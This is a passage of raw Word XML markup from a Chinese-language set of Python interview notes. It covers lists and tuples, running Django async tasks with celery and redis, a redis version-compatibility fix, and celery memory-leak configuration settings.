          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>列表和元组是</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中最常用的两种数据结构，字典是第三种。</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F0083E" w14:textId="325B3D64"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>相同点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E791DD2" w14:textId="666A20F1" w:rsidR="00843D31" w:rsidRPr="00DA0E72" w:rsidRDefault="00DA0E72"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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都是序列</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7779DF52" w14:textId="107EB91C" w:rsidR="00843D31" w:rsidRPr="00DA0E72" w:rsidRDefault="00DA0E72"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都可以存储任何数据类型</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E566C16" w14:textId="68902ECD" w:rsidR="00843D31" w:rsidRPr="00DA0E72" w:rsidRDefault="00DA0E72"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Pr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以通过索引访问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2509A6F3" w14:textId="0BF402A8" w:rsidR="00113B11" w:rsidRPr="00CF0D9D" w:rsidRDefault="00113B11"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152</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是怎么实现异步任务的</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247D51B9" w14:textId="28B0E338" w:rsidR="00843D31" w:rsidRDefault="00843D31" w:rsidP="00843D31">
      <w:r>
        <w:t>答：用celery+redis提交异步任务，然后他又问了一次是怎么实现的，我说因为他单独开了一个socket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B4F5DA" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00DA0E72" w:rsidRDefault="00D96E02"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hyperlink r:id="rId177" w:history="1">
        <w:r w:rsidR="00843D31" w:rsidRPr="00DA0E72">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>Django</w:t>
        </w:r>
        <w:r w:rsidR="00843D31" w:rsidRPr="00DA0E72">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>设置异步任务</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1748AF9F"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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、安装</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Django-celery </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>包：</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pip install django-celery==3.2.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A863150"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2</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、开启</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691EBFFF"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 xml:space="preserve">　　需要使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>做</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，所以在使用异步和定时任务时需要开启</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB89617"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3</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、配置信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5362E53E"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ab/>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis+celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的时候，</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>有什么异常吗。答：没遇到什么异常</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14016327"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celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>常出现的错误是版本问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14458AAA"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使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> celery -A celery_tasks.tasks worker -l info </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>后</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理的时候</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>出现以下错误</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE557C6"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return iter(x.items())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6533B9"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AttributeError: 'str' object has no attribute 'items'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547E3685"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这是版本的问题！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FE5EE4"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安装</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pip install redis==2.10.6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218B0AC0" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00DA0E72" w:rsidRDefault="00843D31" w:rsidP="00DA0E72">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DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django 1.8</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>只能用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">2.10 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>不能用最新的版本，而此时用的是</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django1.8</w:t>
      </w:r>
      <w:r w:rsidRPr="00DA0E72">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E282AE2" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00082DE9" w:rsidRDefault="00D96E02" w:rsidP="00082DE9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="34"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId178" w:history="1">
        <w:r w:rsidR="00843D31" w:rsidRPr="00082DE9">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="34"/>
          </w:rPr>
          <w:t>浅谈工作中</w:t>
        </w:r>
        <w:r w:rsidR="00843D31" w:rsidRPr="00082DE9">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="34"/>
          </w:rPr>
          <w:t>celery</w:t>
        </w:r>
        <w:r w:rsidR="00843D31" w:rsidRPr="00082DE9">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="34"/>
          </w:rPr>
          <w:t>与</w:t>
        </w:r>
        <w:r w:rsidR="00843D31" w:rsidRPr="00082DE9">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="34"/>
          </w:rPr>
          <w:t>Redis</w:t>
        </w:r>
        <w:r w:rsidR="00843D31" w:rsidRPr="00082DE9">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="34"/>
          </w:rPr>
          <w:t>遇到的一些问题</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="160216B7" w14:textId="41B428B8" w:rsidR="00843D31" w:rsidRPr="00CF0D9D" w:rsidRDefault="00082DE9"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153</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>celery</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的内存泄漏？</w:t>
      </w:r>
      <w:r w:rsidR="00843D31" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692E32A2" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D60F18">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">　　</w:t>
      </w:r>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>总结：   celery执行完任务不释放内存与原worker一直没有被销毁有关，因此CELERYD_MAX_TASKS_PER_CHILD可以适当配置小点，而任务并发数与CELERYD_CONCURRENCY配置项有关，   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C596DFC" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　每增加一个worker必然增加内存消耗，同时也影响到一个worker何时被销毁，因为celery是均匀调度任务至每个worker，因此也不宜配置过大，适当配置。  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDD1D0F" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">　　　　 CELERYD_MAX_TASKS_PER_CHILD </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B0B15A" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> 　　　　 CELERYD_CONCURRENCY = 20  # 并发worker数 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6390888F" w14:textId="77777777" w:rsidR="00843D31" w:rsidRPr="00D92594" w:rsidRDefault="00843D31" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
